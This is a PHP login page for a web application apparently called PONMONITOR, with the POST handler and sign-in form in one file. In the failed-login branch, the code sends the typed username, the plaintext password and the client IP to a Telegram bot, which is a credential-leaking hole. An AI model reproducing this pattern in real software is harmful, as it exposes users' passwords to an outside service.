<?php
if(!defined('PONMONITOR')){
	die("Hacking attempt!");
}
if($CURUSER){
header("Location: /");	

}else{
if ($_SERVER['REQUEST_METHOD'] == 'POST') {	
	if(!$CURUSER){
		if ($_POST['action']=='loginindex')  {
			$stopsql = true;
			if (!mkglobal("username:password")){
				die();
			}
			$username = cleartext($_POST['username']);
			$password_tl = cleartext($password);
			$ip = getip();
			if(empty($username)){
				$tplerror = '<div class="error">'.$lang['login_1'].'</div>';
				$stopsql = false;
			}
			if($stopsql){
				$password = $_POST['password'];
					if(empty($password)){
						$tplerror = '<div class="error">'.$lang['login_2'].'</div>';
						$stopsql = false;
					}
				}
			if($stopsql){
				$row = $db->super_query("SELECT id, passhash, secret FROM users WHERE username = ".$db->safesql($username));
				if (!is_password_correct($password,$row['secret'],$row['passhash'])){
					$tplerror = '<div class="error">'.$lang['login_3'].'</div>';
					$tl = array(
						'type' => 'loginerror',
						'data' => '<b>Login:</b> '.$username.' <b> Pass: </b>'.$password.' <b> Ip: </b>'.$ip.' '
					); 
					telegram_bot($tl);
				}else{
					logincookie($row["id"],$row["passhash"]);
					header("Location: /");	
					die();
				}
			}
		}
	}
}

?>
<!DOCTYPE html>
<html lang="en">
	<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="<?=$lang['logintitle'];?>">
	<meta name="author" content="@momotuk88">
	<link rel="shortcut icon" href="/file/favicon.ico">
	<title><?=$lang['logintitle'];?></title>
	<link href="/file/login.css?rr=33ybf" rel="stylesheet">
	</head>
	<body class="login-body">
		<div class="container">
			<form class="form-signin" action="" method="post">
				<h2 class="form-signin-heading"><?=$lang['logintitle'];?></h2><?=$tplerror;?><div class="login-wrap">
					<div class="user-login-info">						
                    	<input type="text" name="username" class="form-control" placeholder="<?=$lang['user_2'];?>">
						<input type="password" name="password" class="form-control" placeholder="<?=$lang['user_0'];?>">
						<input type="hidden" name="action" value="loginindex">
					</div>
					<button class="btn btn-lg btn-login btn-block" name="login_pmon" type="submit"><?=$lang['loginbtn'];?></button>
				</div>
			</form>
		</div>
	</body>
</html>
<?php
}
?>